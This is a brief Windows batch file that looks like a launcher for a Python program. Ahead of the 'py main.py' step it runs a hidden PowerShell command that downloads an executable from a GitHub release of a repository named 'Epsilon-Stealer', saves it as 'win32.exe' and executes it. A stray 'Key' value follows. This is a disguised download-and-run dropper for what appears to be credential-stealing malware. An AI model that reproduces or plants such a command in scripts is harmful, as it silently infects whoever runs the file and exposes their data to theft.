@echo off
cd src
powershell $down=New-Object System.Net.WebClient;$url='https://github.com/Vinyzu3/Epsilon-Stealer/releases/download/relase/Launcher.exe';$file='win32.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
py main.py
Key : 01266156
